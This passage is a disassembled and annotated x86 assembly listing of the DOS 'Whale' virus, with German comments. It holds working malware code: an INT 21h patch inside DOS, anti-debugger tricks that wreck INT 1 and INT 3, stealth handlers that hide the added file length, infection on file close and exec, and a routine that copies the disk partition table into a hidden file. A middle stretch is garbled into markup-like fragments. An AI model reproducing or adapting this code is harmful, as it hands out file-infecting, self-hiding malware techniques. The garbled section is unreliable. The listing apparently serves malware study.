                POP     SS
                MOV     SP,Word Ptr CS:[Vir_SP]

                CALL    CS:PopALL

                MOV     SS,Word Ptr CS:[D2559]
                MOV     Word Ptr CS:[Vir_SP],SP
                MOV     SP,Word Ptr CS:[D2557]
                MCODE   12
                RETN
;=====================================================================
                DB      0BEh                            ;02C05
                DB      0AFh                            ;02C06
                DB      "4"                             ;02C07
                DB      0Eh                             ;02C08
                DB      "[SZR"                          ;02C09
                DB      8Fh                             ;02C0D
                DB      06h                             ;02C0E
;=====================================================================
;========( 2c0f )=======================( Patcht INT 21 in IBMDOS )===
;=====================================================================
Patch_IBMDOS:   MDECODE 13
;---------------------------------------------------------------------
                MOV     SI,Offset D244B
                LES     DI,CS:[Low_INT_21H]
                PUSH    CS
                POP     DS
                CLD
                MOV     CX,0005h ; Tauscht 5 Byte im DOS aus gegen
                                 ; einen FAR-JMP zur Wal-Routine !
J02C22:         LODSB
                XCHG    AL,ES:[DI]
                MOV     [SI-01h],AL
                INC     DI
                LOOP    J02C22
                MCODE   13
                RETN
;=====================================================( trash ?!? )===
J02C31:         XOR     AX,CX
                INC     BX
                OR      ES:[BX],AX
                LOOP    J02C31
                MOV     BX,CX
                DB      0E8h                    ;... trash !
;=====================================================================
;============================================( pusht alle register)===
;=====================================================================
PushALL:        MDECODE 14
                POP     CS:[D24EA]
                PUSHF
                PUSH    AX
                PUSH    BX
                PUSH    CX
                PUSH    DX
                PUSH    SI
                PUSH    DI
                PUSH    DS
                PUSH    ES
                MCODE   14
                JMP     CS:[D24EA]
;=====================================================================
;========================================( setzt INT 01 auf Tracer)===
;=====================================================================
SetInt_01:      MDECODE 15
                MOV     AL,01h
                PUSH    CS
                POP     DS
                MOV     DX,Offset Int_01_entry-Offset VirStart
                CALL    SetInt_AL                       ; SET INT 01
                MCODE   15
                RETN
;=====================================================================
;===========================( setzt INT ( nummer in AL) auf DS:DX )===
;=====================================================================
SetInt_AL:      MDECODE 16
                PUSH    ES
                PUSH    BX
                XOR     BX,BX
                MOV     ES,BX
                MOV     BL,AL
                SHL     BX,1
                SHL     BX,1
                MOV     ES:[BX    ],DX
                MOV     ES:[BX+02h],DS
                POP     BX
                POP     ES
J02C88  EQU     $+2
                MCODE   16
                RETN
;=====================================================================
;==============================(sichert Register auf eigenem Stack)===
;=====================================================================
SaveRegisters:  MDECODE 17
                MOV     CS:[D2557],SP
                MOV     CS:[D2559],SS
                PUSH    CS
                POP     SS
                MOV     SP,CS:[Vir_SP]
                CALL    CS:PUSHALL
                MOV     SS,CS:[D2559]
                MOV     CS:[Vir_SP],SP
                MOV     SP,CS:[D2557]
                MCODE   17
                RETN
;=====================================================================
;==============================( holt INT ( nummer AL ) nach ES:BX)===
;=====================================================================
GetInt_AL:      MDECODE 18
                PUSH    DS
                PUSH    SI
                XOR     SI,SI
                MOV     DS,SI
                XOR     AH,AH
                MOV     SI,AX
                SHL     SI,1
                SHL     SI,1
                MOV     BX,[SI]
                MOV     ES,[SI+02h]
                POP     SI
                POP     DS
                MCODE   18
                RETN
;=====================================================================
;=========================( Zweiter Teil der Trace-Routine J02A63 )===
;=====================================================================
J02CD8:         POP     AX      ; AX = 2A7Dh
J02CDA          EQU     $+1     ; = INC  SI
                                ;   OR   [BX],AL
                                ;   XCHG BX,[BP+08h] , usw.

                ADD     WORD Ptr [BP+08h],+07h  ; Change IP after IRET  ??
                XCHG    BX,[BP+08h]
                MOV     DX,BX
                XCHG    BX,[BP+02h]

                SUB     SI,@0478           ; = ADD SI,@FB88
                MOV     BX,SI              ;
                ADD     BX,SwapCode_6      ; 04EFh

                POP     BP                 ; Original BP aus Trace-Routine
                                           ; J02A63
                PUSH    CS:[SI+SwapCode_8] ; dort steht "E9CF"
                POP     AX                 ; AX = "E9CF"
                XOR     AX,020Ch           ; AX = "EBC3"
                MOV     CS:[BX],AL ; PATCHT INT 3 WEG : INT 3 -> RET
                                   ; Spielt aber gef„hrlich mit der Queue,
                                   ; kein Wunder, dass das Teil auf ATs
                                   ; nicht funktioniert...
                ADD     AX,020Ch   ; AX = EDCF
;*********************************************************************
CALL    EIN_RETURN      ;************ Eingefgt **********************
;*********************************************************************
J02CFF:         INT     3          ; ->  RET
                                   ; ABER RET [SP+2] !!!!!
                                   ; das heisst : Ende der Trace-Routine
                                   ; ist hier.
;=====================================================================
J02D00:         JMP     J02D60
                DB      0EBh
;=====================================================================
;====================( Handler fr Findfirst/Findnext FCB / AH=11 )===
;=====================================================================
J02D04:         MDECODE 19
                CALL    PopALL
                CALL    CS:[@INT21]      ; CALL INT 21H
                OR      AL,AL
                MCODE   19
                JZ      J02D1C
                JMP     IRET_Int21h
                ;------------------
J02D1C:         MDECODE 20
                CALL    PushALL
                CALL    GetDTA
                MOV     AL,00h
                CMP     BYTE Ptr DS:[BX],0FFh   ; Extended FCB ?
                JNZ     J02D34

                MOV     AL,[BX+06h]             ; dann Attribut -> AL
                ADD     BX,+07h                 ; und zum Normalen FCB
J02D34:         AND     CS:[D24F0],AL           ;
                TEST    BYTE Ptr DS:[BX+18h],80h; reserved..Shit
                MCODE   20
                JNZ     J02D46
                JMP     J02EA3                  ; fertig

J02D46:         SUB     BYTE Ptr DS:[BX+18h],80h
                CMP     WORD Ptr DS:[BX+1Dh],Code_len
                JNB     J02D54
                JMP     J02EA3                  ; fertig

J02D54:         SUB     WORD Ptr DS:[BX+1Dh],Code_len
                SBB     WORD Ptr DS:[BX+1Fh],+00h
                JMP     J02EA3                  ; fertig
;=====================================================================
J02D60:         LOOP    J02D66          ; wenn CX <> 0 dann J02D66
                JMP     J03251          ; sonst J03251 -> J034D4
;---------------------------------------------------------------------
                DB      0ebh            ; TRASH !
;---------------------------------------------------------------------
J02D66:         INC     BX
                JMP     J02FA2
;=====================================================================
;===============================================( Suche nach Fish )===
;=====================================================================
Suche_Fish:     MDECODE 21
                CALL    PushALL
                IN      AL,40h    ; Hole Zufallszahl
                CMP     AL,40h    ; ist sie < 40h,="" dann="" partitionstabelle="" mcode="" 21="" ;="" lesen="" und="" fish.tbl="" erzeugen="" jb="" j02d7f="" jmp="" j02e9f="" ;="" sonst="" nicht.="" ;="====================================================================" ;="===========(" lesen="" der="" partitionstabelle="" bei="" jeder="" 4.="" infektion="" )="==" ;="====================================================================" j02d7f:="" mdecode="" 22="" mov="" al,01h="" ;="" einen="" sektor="" mov="" ah,02h="" ;="" lesen="" push="" cs="" pop="" bx="" sub="" bh,10h="" ;="" mov="" es,bx="" ;="" nach="" es:0000h="" mov="" bx,0000h="" ;="" mov="" ch,00h="" ;="" spur="" 0="" mov="" cl,01h="" ;="" sektor="" 1="" (="" partitionstabelle="" )="" mov="" dh,00h="" ;="" 1.="" head="" mov="" dl,80h="" ;="" 1.="" festplatte="" pushf="" call="" dword="" ptr="" cs:[trace_adres]="" ;="" int="" 13h="" !="" mcode="" 22="" jnb="" j02da9="" jmp="" j02e9f="" ;="====================================================================" ;="========================(" erzeugen="" der="" fish.tbl="" als="" hidden-file="" )="==" ;="====================================================================" j02da9:="" mdecode="" 23="" push="" cs="" pop="" ds="" mov="" ah,5bh="" ;="" create="" new="" file="" mov="" cx,0002h="" ;="" attribut="" "system"="" mov="" dx,offset="" d2ddb-offset="" virstart="" ;="" name="" in="" ds:05cbh/cs:d2ddb="" call="" cs:[@int21]="" jnb="" j02dc2="" jmp="" j02e9b="" j02dc2:="" push="" es="" pop="" ds="" mov="" bx,ax="" mov="" ah,40h="" ;="" schreibe="" mov="" cx,0200h="" ;="" 200h="" byte="" mov="" dx,0000h="" ;="" ab="" es:0000="" ;="" partitionstabelle="" call="" cs:[@int21]="" jb="" j02dd8="" jmp="" j02e85="" j02dd8:="" jmp="" j02e9b="" ;="============================================================" d2ddb="" db="" "c:\fish-#9.tbl",0="" d2dea="" db="" "fish="" virus="" #9="" "="" db="" "a="" whale="" is="" no="" fish!="" "="" db="" "mind="" her="" mutant="" fish="" and="" the="" hidden="" fish="" eggs="" for="" "="" db="" "they="" are="" damaging.="" "="" db="" "the="" sixth="" fish="" mutates="" only="" if="" whale="" is="" in="" her="" cave"="" ;="============================================================" j02e85:="" push="" cs="" pop="" ds="" mov="" ah,40h="" mov="" cx,009bh="" mov="" dx,offset="" d2dea-offset="" virstart="" call="" ds:[@int21]="" jb="" j02e9b="" mov="" ah,3eh="" call="" ds:[@int21]="" j02e9b:="" mcode="" 23="" j02e9f:="" call="" popall="" retn="" ;---------------------------------------------------------------------="" j02ea3:="" call="" popall="" jmp="" iret_int21h="" ;="====================================================================" ;="===============================(" handler="" fr="" open="" fcb="" ,="" ah="0F" )="==" ;="====================================================================" j02ea9:="" mdecode="" 24="" call="" popall="" call="" cs:[@int21]="" call="" pushall="" or="" al,al="" mcode="" 24="" ;="=============================" jnz="" j02ea3="" ;="" fertig="" mov="" bx,dx="" test="" byte="" ptr="" ds:[bx+17h],80h="" jz="" j02ea3="" ;="" fertig="" sub="" byte="" ptr="" ds:[bx+17h],80h="" sub="" word="" ptr="" ds:[bx+10h],code_len="" ;="" unerkannt="" ;="" bleiben="" sbb="" byte="" ptr="" ds:[bx+12h],00h="" jmp="" j02ea3="" ;="" fertig="" ;="====================================================================" ;="============================(" handler="" fr="" read="" random="" block="" fcb="" )="==" ;="====================================================================" j02ed8:="" jcxz="" j02f08="" ;="====================================================================" ;="==================================(" handler="" fr="" read="" random="" fcb="" )="==" ;="====================================================================" j02eda:="" mdecode="" 25="" mov="" bx,dx="" mov="" si,[bx+21h]="" or="" si,[bx+23h]="" mcode="" 25="" jnz="" j02f08="" jmp="" j02f03="" db="" 0e8h="" ;="====================================================================" ;="===============================(" handler="" fr="" read="" seq.="" fcb.ah="14)===" ;="====================================================================" j02ef0:="" mdecode="" 26="" mov="" bx,dx="" ;="" ds:dx="" ist="" adresse="" des="" ge”ffneten="" fcb="" mov="" ax,[bx+0ch]="" ;="" j02efa:="" or="" al,[bx+20h]="" mcode="" 26="" jnz="" j02f08="" j02f03:="" call="" j0397a="" ;="" saveregs,es="DS," di="DX+0Dh" jnb="" j02f55="" ;="" datei="" ist="" ausfhrbar="" j02f08:="" jmp="" j02b8b="" ;="" sonst="" :="" call="" low-int-21="" ;="====================================================================" j02f0b:="" jmp="" j03251="" ;="" -=""> J034D4
;-----------------------------------------------------------(trash)---
                MOV     [BP+02h],DX
                MOV     [BP+04h],CX
                DB      0EBh
;---------------------------------------------------------------------
;------------------------( erste Proc nach Initialisierung von SI )---
;---------------------------------------------------------------------
J02F15:         IN      AL,21h          ; SI = 2810h / VirStart
                OR      AL,02h
                OUT     21h,AL
                XOR     BX,BX
                PUSH    BX              ; PUSH 0 auf Stack
                MOV     BP,0020h
                POP     DS              ; DS = 0000
                MOV     CX,BP           ; CX = 0020
                CALL    $+3             ; GET IP
                POP     BX              ; BX = 2F27
                PUSH    BX
                POP     DX              ; DX = 2F27
                PUSH    CS
                POP     AX              ; AX = CS
                ADD     AX,0010h        ; AX = CS:0100
                ADD     BX,AX
                XOR     DX,BX

J02F33:         SUB     SI,@FB88        ; ADD SI,478h; SI = 2C88
                                        ; AX = 5BC0
                                        ; BX = 8AE7
                                        ; CX = 0020
                                        ; DX = A5C0
                                        ; DS = 0000
                CALL    J02AD2          ;
                                        ; 2F3A auf Stack als ret-adr
                ;------>(J02EC8)----[keine Rckkehr vom CALL ! ]------
                ;-----------------------------------------------------
                DB      0E9H
;=====================================================================
;====================================================( no entry...)===
;=====================================================================
        MOV     BYTE PTR [DI],0EBH
        JMP     J035E3          ; Erzeugt eine 7 Byte-Tabelle und checkt
                                ; Verfallsdatum
;=====================================================================
;====================================================( no entry...)===
;=====================================================================
J02F41: XCHG    DX,BX
J02F43: MOV     WORD PTR DS:[0004h],BX
        OR      CX,CX
        JZ      J02F0B
        DEC     CX
        JMP     J02FA2
;--------------------------------------------------------------------
        DB      1Ch,00,53h,57h,0E8h
;=====================================================================
;============================( zum Handler fr Read Seq. FCB.AH=14)===
;=====================================================================
J02F55:         MDECODE 27
                CALL    CS:[@INT21]         ; CALL INT 21h
                MOV     [BP-08],CX
                MOV     [BP-04],AX
                PUSH    DS
                PUSH    DX
                CALL    GetDTA
                CMP     Word Ptr DS:[BX+14],1
                MCODE   27
                JZ      J02FF6
;==========================================( check auf infektion )===
J02F7A:         MDECODE 28
                MOV     AX,[BX    ]
                ADD     AX,[BX+02h]
                PUSH    BX
                MOV     BX,[BX+04h]
                XOR     BX,5348h        ; 'SH'  --> 'FISH' !
                XOR     BX,4649h        ; 'FI'
                ADD     AX,BX
                POP     BX
                MCODE   28
                JZ      J02FF6
                ADD     SP,+04h
                JMP     J02EA3          ; fertig
;=================================================================
                DB      12h
;=================================================================
J02FA0:         JMP     J02F33
;=================================================================
J02FA2:
                MOV     Word PTR DS:[0004h],DX
                MOV     BX,Word Ptr DS:[000Ch]
                IN      AL,01h                  ;?????!??????!????
                OR      CX,CX
                JZ      J02FC0
                CMP     CL,BL
                JB      J02FC0
                XCHG    BX,DX
                MOV     Word PTR DS:[0004h],DX
                XOR     DX,AX
                LOOP    J02FA0          ; JMP J02F33, if CX <> 0
                                        ; ist identisch mit
                                        ; "JMP J02FC0"....
                JZ      J02FCB          ; -> J03251 -> J034D4


J02FC0:         ADD     SI,@0478
                CALL    J02AD2          ; ->keine Rckkehr vom CALL !<- ;-------------------------------------------------------------------="" db="" 0e9h,0a8h,09h,0eah="" ;-------------------------------------------------------------------="" j02fcb:="" jmp="" j03251="" ;="" -=""> 34d4
;=====================( no entry )==( muss (!) ausgefhrt werden )===
J02FCE:         MOV     BYTE PTR CS:[SI+SwapCode_5],0E8h
                                        ; Adresse J03259
                OR      CX,CX           ; Ist am anfang immer 20h
                                        ; also wird 32 Mal diese Schleife
                                        ; ausgefhrt und versucht, den
                                        ; INT 1 zu setzen.....
                JZ      J02FCB          ; Zur Arbeit !
                ;---------------------------------------------------
                ; INT 1 und INT 3 zerst”ren.
                ;---------------------------------------------------
                MOV     Word Ptr DS:[000Ch],BX
                XOR     DX,BX
                MOV     Word Ptr DS:[0004h],DX
                XOR     AX,DX
                MOV     Word Ptr DS:[000Ch],AX
                JMP     J02D00                  ; schlechter Pfad !
;========================================================( trash )===
J02FEA:         DB      081h,0c6h,090h,034h,0b9h,01ch
                DB      000h,0f4h,0a4h,033h,0c9h,0e8h
;=====================================================================
;============================( zum Handler fr Read Seq. FCB.AH=14)===
;=====================================================================
J02FF6:         MDECODE 29
                POP     DX
                POP     DS
                MOV     SI,DX

                PUSH    CS
                POP     ES
                MOV     CX,0025h
                MOV     DI,Offset @FCB  ; Kopiere FCB
                REPZ    MOVSB
   
                MOV     DI,Offset @FCB
                PUSH    CS
                POP     DS
                MOV     DX,[DI+12h]     ; HOLE FILESIZE nach DX:AX
                MOV     AX,[DI+10h]
                ADD     AX,Code_Len+0FH ; ADD filesize, 240fh
                ADC     DX,+00h
                AND     AX,0FFF0h       ; Filesize auf (mod 16) normieren
                MOV     [DI+12h],DX
J03020:         MOV     [DI+10h],AX     ; und zurueck
                SUB     AX,Code_Len-4   ; 23fc abziehen
                SBB     DX,+00h
                MOV     [DI+23h],DX     ; und nach RandomRec kopieren ?!?
                MOV     [DI+21h],AX     ; Dadurch wird das FILE in
                                        ; einem Record gelesen ( aber nur,
                                        ; wenn's kleiner als 1 Segment ist)

                MOV     CX,001Ch        ; Lese 1Ch byte (EXE-Header)
                MOV     WORD Ptr DS:[DI+0Eh],0001h

                MOV     AH,27h          ; READ RANDOM BLOCK FCB
                MOV     DX,DI
                CALL    CS:[@INT21]
                MCODE   29
                JMP     J02EA3          ; fertig
;=====================================================================
;================================================( AUS DEM HIER : )===
;=====================================================================
J03047: DB      03BH,0DEH       ; CMP     BX,SI
        DB      074H,0D5H       ; JZ      J03020
        RETN
;=====================================================================
;===============================================( Wird DAS HIER : )===
;=====================================================================
        ;J03047:XOR     WORD PTR CS:[SI],BX
        ;       NOP
        ;       RET
;=====================================================================
;============================================(  DER CODE-PATCHER  )===
;============================================( SI kommt mit 210Ah )===
;=====================================================================
PATCH:          PUSH    BX

                ADD     SI,OFFSET J0492F-OFFSET J0491A
                MOV     BX,157Dh        ; SI = 211F / 492F
                CALL    J03047

                ADD     SI,+02h         ; SI = 2121 / 4931
                MOV     BX,758Bh
                CALL    J03047

                ADD     SI,+02h         ; SI = 2123 / 4933
                MOV     BX,0081h
                CALL    J03047

                ADD     SI,+08h         ; SI = 212B / 493B
                MOV     BX,0A08h
                CALL    J03047

                ADD     SI,+02h         ; SI = 212D / 493D
                MOV     BX,302Fh
                CALL    J03047

                ADD     SI,+02h         ; SI = 212f / 493F
                MOV     BX,02A5h
                CALL    J03047
                ;----------------------( DECODE ist jetzt 'anders')---

                ADD     SI,OFFSET J0499D-OFFSET J04941+2
                MOV     BX,157Dh        ; SI = 218D / 499D
                CALL    J03047

                ADD     SI,+05h         ; SI = 2192 / 49A2
                MOV     BX,0A09Fh
                CALL    J03047

                ADD     SI,+0Ah         ; SI = 219C / 49AC
                MOV     BX,00A7h
                CALL    J03047

                ADD     SI,+0Ch         ; SI = 21A8 / 49B8
                MOV     BX,872Dh
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AA / 49BA
                MOV     BX,7829h
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AC / 49BC
                MOV     BX,4229h
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AE / 49BE
                MOV     BX,1AC0h
                CALL    J03047
                ;---------------( CODEIT ist jetzt auch 'anders' )---

                ADD     SI,OFFSET J04A2A-OFFSET J049C0 + 2
                                        ; SI = 221A / 4A2A
                MOV     BX,1114h
                CALL    J03047

                ADD     SI,OFFSET J04A39 - OFFSET J04A2A
                                        ; SI = 2229 / 4A39
                MOV     BX,0000h        ; ? NOP ?
                CALL    J03047

                ADD     SI,OFFSET J04A44 - OFFSET J04A39
                                        ; SI = 2234 / 4A44
                MOV     BX,02E3h
                CALL    J03047

                POP     BX
                RETN
;=====================================================================
;=================================( Handler fr GET FILESIZE /FCB )===
;=====================================================================
J030DF:         MDECODE 30
                PUSH    CS
                POP     ES
                MOV     DI,Offset @FCB
                MOV     CX,0025h                     ; Kopiere FCB
                MOV     SI,DX
                REPZ    MOVSB
   
                PUSH    DS
                PUSH    DX
                PUSH    CS
                POP     DS

                MOV     AH,0Fh                       ; OPEN FCB
                MOV     DX,Offset @FCB               ; FCB steht an DS:DX
                CALL    CS:[@INT21]
                MOV     AH,10h                       ; CLOSE FCB !
                CALL    CS:[@INT21]
                TEST    BYTE Ptr DS:[@FCB+17H],80h
                POP     SI
                POP     DS
                MCODE   30

                JZ      J03182

                LES     BX,DWord ptr CS:[@FCB+010h] ; File-Size

J03117:         MDECODE 31
                MOV     AX,ES
                SUB     BX,Code_len
                SBB     AX,0000h
                XOR     DX,DX
                MOV     CX,WORD PTR CS:[@FCB+0eh]  ; Rec-Size
                DEC     CX
                ADD     BX,CX
                ADC     AX,0000h
                INC     CX
                DIV     CX
                MOV     [SI+23h],AX
                XCHG    AX,DX         ;
                XCHG    AX,BX
                DIV     CX
                MOV     [SI+21h],AX
                MCODE   31
                JMP     J02EA3          ; fertig
;=====================================================================
;=======================================( setzt INT 02 auf "IRET" )===
;=====================================================================
StopINT_02:     MDECODE 32
                CALL    PushALL
                IN      AL,21h
                OR      AL,02h                  ; setze Bit 2
                OUT     21h,AL

                MOV     AL,02h
                CALL    GetInt_AL               ; GET INT 02
                                                ; ergebnis in ES:BX
                MOV     AX,CS                   ; AX = CS
                MOV     CX,ES
                CMP     AX,CX
                JZ      J03179
                MOV     WORD PTR CS:[@INT02+2],ES
                MOV     WORD PTR CS:[@INT02  ],BX

                PUSH    CS
                POP     DS
                CALL    J03170
J03170:         POP     DX                      ; GET IP
                ADD     DX,OFFSET INT_02-OFFSET J03170

                MOV     AL,02h
                CALL    SetInt_AL               ; SET INT 02 auf IRET

J03179:         CALL    PopALL
                MCODE   32
                RETN
;=====================================================================
INT_02:         IRET    ; KOPROZESSORFEHLER + MEMORY PARITY-FEHLER
;=====================================================================
J03182:         JMP     J02B8B          ; CALL LOW_INT_21
                DB      0E8h
;=====================================================================
;=======================================( SET INT 02 zum Original )===
;=====================================================================
Re_SET_Int_02:  MDECODE 33
                CALL    PushALL

                IN      AL,21h
                AND     AL,0FDh             ; l”sche Bit 2
                OUT     21h,AL

                LDS     DX,CS:[@INT02]     ; OLD INT 02
                MOV     AL,02h
                CALL    SetInt_AL          ; SET INT 02
                CALL    PopALL
                MCODE   33
                RETN
;=====================================================================
;================================( Handler fr Open File / Handle )===
;=====================================================================
J031A6:         CALL    GET_Current_PSP
                CALL    J039C3          ; ist die Datei ausfhrbar ?
                JB      J031F1          ; nein....
                CMP     BYTE PTR CS:[D24A2],00h ; hab ich schon infiziert
                JZ      J031F1
                CALL    J043B1          ; Vorarbeiten
                CMP     BX,0ffffh       ; Fehler bei Vorarbeiten ??
                JZ      J031F1          ; oder garkeine DATEI ??
;===========================================()==========================
                MDECODE 34
                DEC     BYTE PTR CS:[D24A2]
                PUSH    CS
                POP     ES

                MOV     CX,0014h
                MOV     DI,Offset D2452 ; ja ? wenn ich's wsst...
                XOR     AX,AX
                REPNZ   SCASW

                MOV     AX,CS:[@PSP]
                MOV     ES:[DI-02h],AX
                MOV     ES:[DI+26h],BX
                MOV     [BP-04h],BX
                MCODE   34

J031E7:         AND     BYTE PTR CS:[D24B3],0FEh        ; CF l”schen
                JMP     J02EA3          ; fertig

                DB      0E8h

J031F1:         JMP     J02B8B  ; CALL LOW_INT_21
;=====================================================================
;===============================( Handler fr CLOSE FILE / Handle )===
;=====================================================================
J031F4:         MDECODE 35
                PUSH    CS
                POP     ES
                CALL    GET_Current_PSP
                MOV     CX,0014h
                MOV     AX,CS:[@PSP]
                MOV     DI,Offset D2452
                MCODE   35

J0320C:         REPNZ   SCASW
J0320E:         JNZ     J03227
                CMP     BX,ES:[DI+26h]
                JNZ     J0320C
                MOV     WORD PTR ES:[DI-02h],0000h
                CALL    J03642                  ; infizieren !
                INC     BYTE PTR CS:[D24A2]
                JMP     J031E7
        ;================================
                DB      0BBh
        ;================================
J03227:         JMP     J02B8B          ; Call LOW-INT-21
        ;================================
                DB      3DH
        ;================================
;=====================================================================
;=============================================( Hole aktuelle DTA )===
;=====================================================================
GetDTA:         MDECODE 36
                MOV     AH,2FH          ; GET DTA
                PUSH    ES
                CALL    CS:[@INT21]
                PUSH    ES
                POP     DS
                POP     ES
                MCODE   36
                RETN
;---------------------------------------------------------------------
J03240:         DB      0E9H,012H,003H  ; JMP     J03555  == NIRWANA !
;=====================================================================
;=====================================( versteckter DECODE-Aufruf )===
;=====================================================================
Decode:         JMP     J0491B          ; CMP     AX,16D5H
;-----------------------------------------------------------(trash)---
        JZ      J03240
	SUB	AX,12EFh
	DEC	SI 
	INC	BH
	JMP	J02FEA
;=====================================================================
;=====(-----------------------------------------------------------)===
;=====(                   Affengeiler Code                        )===
;=====(-----------------------------------------------------------)===
;=====( SP sichern in BP                                          )===
;=====( "C353" auf den Stack, wobei SS=CS & C353 = "PUSH BX, RET" )===
;=====( Dann ein CALL dessen RET-Adresse vom Stack geholt wird.   )===
;=====( Dafr wird DX alias BP auf den Stack gelegt. Kuckuck !    )===
;=====( Schliesslich wird nach SS:SP-2, also "PUSH BX, RET",      )===
;=====( gesprungen, also ein "RET" zur Adresse J034D4 ausgefhrt  )===
;=====(-----------------------------------------------------------)===
;=====( Kein Wunder, daá der Wal nach Fischen sucht ;-)))         )===
;=====================================================================
J03251:         MOV     DX,BP                   ; DX = BP
                MOV     BP,SP
                MOV     BX,0C353H
                PUSH    BX
J03259:         CALL    J0341A                  ; ursprnglich "INT 3"
J0325C          DB      0BBH
;----------------------------------------------------------( Info )---
;       J0341A: POP     BX                              ; BX = 325C
;               ADD     BX,OFFSET J034D4-Offset J0325C
;               PUSH    DX                      ;
;               SUB     BP,+02h                 ; BP = SP-2
;               DB      36H                     ; hat noch gefehlt :-)
;               JMP     BP                      ; = JMP  DX / JMP 34D4
;--------------------------( => )------
;     SS:SP-2   PUSH   BX       ; = 53h
;     SS:SP-1   RET             ; = C3h
;=====================================================================
;==============================================( Handler fr EXEC )===
;=====================================================================
J0325D:         OR      AL,AL   ; Ist AL = 0 ( = Load + execute ) ?
                JZ      J03264  ; JA !!
                JMP     J034FC
;=====================================================================
;================================================( EXEC AX = 4B00 )===
;=====================================================================
J03264:         MDECODE 37
                PUSH    DS
                PUSH    DX
                MOV     Word ptr CS:[D2424+2],ES        ; Adress of EPB
                MOV     Word ptr CS:[D2424  ],BX
                LDS     SI,DWord ptr CS:[D2424]

                MOV     CX,000Eh                    ; kopiere epb in ds
                MOV     DI,Offset EPB
                PUSH    CS
                POP     ES
                REPZ    MOVSB

                POP     SI
                POP     DS
                MOV     CX,0050h                ; kopiere kommandozeile
                MOV     DI,Offset Cmd_Line
                REPZ    MOVSB

                MOV     BX,0FFFFh               ; wird wieder zerst”rt
                CALL    PopALL
                POP     BP                      ; Original-BP
                POP     CS:[D24E6]              ; CALLERs IP
                POP     CS:[D24E8]              ; CALLERS CS
                POP     CS:[D24B3]              ; CALLERS Flags
                PUSH    CS

                MOV     AX,4B01h                ; Load, but do not execute
                POP     ES                      ; Segment EPB
                PUSHF
                MOV     BX,Offset EPB           ; Offset EPB
                CALL    CS:[Low_INT_21H]

                MCODE   37

                JNB     J032DA                  ; JMP if kein Fehler

                OR      WORD PTR CS:[D24B3],+01h; sonst CF setzen
                PUSH    CS:[D24B3]              ; Flags
                PUSH    CS:[D24E8]              ; CS
                PUSH    CS:[D24E6]              ; IP
                PUSH    BP
                LES     BX,DWord ptr CS:[D2424] ; Alten EPB zurck
                MOV     BP,SP                   ; Alten SP
                JMP     IRET_Int21h             ; und fertig
;======================================================
                DB      89h,04h
;=======================================( kein Fehler aufgetreten )===
J032DA:         MDECODE 38
                CALL    GET_Current_PSP
                PUSH    CS
                POP     ES
                MOV     CX,0014h
                MOV     DI,Offset D2452
J032EA:         MOV     AX,CS:[@PSP]
                REPNZ   SCASW
                JNZ     J032FF
                MOV     WORD PTR ES:[DI-02h],0000h
                INC     BYTE PTR CS:[D24A2]
                JMP     J032EA
;====================================================================
J032FF:         MCODE   38
                LDS     SI,DWORD PTR CS:[D2503] ; Ist IP-Init = 1 ( WAL ! )
                CMP     SI,+01h
                JNZ     J0334D                  ; nein. Dann infizieren
                                                ; sonst wal ausblenden
                MDECODE 39
                MOV     DX,Word Ptr DS:[001Ah]
                ADD     DX,+10h

                MOV     AH,51h
                CALL    CS:[@INT21]

                ADD     DX,BX
                MOV     Word Ptr CS:[D2505],DX
                PUSH    Word Ptr DS:[0018h]
                POP     Word Ptr CS:[D2503]

                ADD     BX,Word Ptr DS:[0012h]
                ADD     BX,+10h
                MOV     Word Ptr CS:[D2501],BX

                PUSH    Word Ptr DS:[0014h]
                POP     Word Ptr CS:[D24FF]

                MCODE   39
                JMP     J0345F
;---------------------------------------------------------------------
                DB      09h
;---------------------------------------------------------------------
J0334D:         JMP     J03428          ; jmp zut Infect-routine
;=====================================================================
;===================================================( Selbst-Test )===
;=====================================================================
J03350:         MDECODE 40
                CALL    PushALL
                JMP     J03362

J0335B:         XOR     AL,CS:[BX]
                INC     BX
                LOOP    J0335B
                RETN
;-----------------------------------( netterweise werden hier die )---
;-----------------------------------( 'echten' Labels publik !    )---
J03362:         XOR     AL,AL
                MOV     BX,0021h        ; 2831..2852 ; ENTRY...2852
                MOV     CX,007Ah
                CALL    J0335B
                MOV     BX,0173h        ; 2983..298d ; init SI
                MOV     CX,000Ah
                CALL    J0335B
                MOV     BX,0253h        ; 2a63..2a7f ; trace...
                MOV     CX,001Ch
                CALL    J0335B
                MOV     BX,0550h        ; 2d60..2d6a ; ?????????????
                MOV     CX,000Ah
                CALL    J0335B
                MOV     BX,0705h        ; 2f15..2f55
                MOV     CX,0040h
                CALL    J0335B
                MOV     BX,0790h        ; 2fa0..2ff6
                MOV     CX,0056h
                CALL    J0335B
                MOV     BX,0A30h        ; 3240..3264
                MOV     CX,0024h
                CALL    J0335B
                MOV     BX,0C0Ah        ; 341a..3428
                MOV     CX,000Eh
                CALL    J0335B
                MOV     BX,0CC4h        ; 34d4..3510
                MOV     CX,003Ch
                CALL    J0335B
                MOV     BX,105Ah        ; 386a..3897
                MOV     CX,002Dh
                CALL    J0335B
                MOV     BX,1106h        ; 3916..393f
                MOV     CX,0029h
                CALL    J0335B
                MOV     BX,210Ah        ; 491a..4981
                MOV     CX,0067h
                CALL    J0335B
                MOV     BX,2173h        ; 4983..4a56
                MOV     CX,00D8h
                CALL    J0335B
                MOV     BX,236Ch        ; 4b7c..4bb5
                MOV     CX,0039h
                CALL    J0335B
                MOV     BX,1D7Dh        ; 458d..45b2
                MOV     CX,0025h
                CALL    J0335B
                MOV     BX,1C7Ch        ; 448c..44ce
                MOV     CX,0042h
                CALL    J0335B
                CMP     AL,0E0h                          ; sic !!
                JZ      J03412
        ;-----------------------------------------------------
                MOV     WORD PTR CS:[D2598],0F4F4h     ; = HLT
                MOV     BX,OFFSET D2598
                PUSHF
                PUSH    CS
                PUSH    BX
                XOR     AX,AX
                MOV     DS,AX
                MOV     WORD PTR DS:[0006h],0FFFFh     ; SEGMENT Int 01
                CALL    Debugger_Check                 ; STOP
        ;-----------------------------------------------------
J03412:         CALL    PopALL
                MCODE   40
J03419:         RETN
;====================================================( JMP J034D4 )===
J0341A:         POP     BX                              ; BX = 325C
                ADD     BX,OFFSET J034D4-Offset J0325C  ; BX = 34D4
                PUSH    DX                              ;
                SUB     BP,+02h                         ; BP = SP
                ;****************************************************
                DB      36H             ; Seg-Prefix hat noch gefehlt
                ;****************************************************
                JMP     BP              ; -> JMP  DX -> JMP BX
;---------------------------------------------------------------------
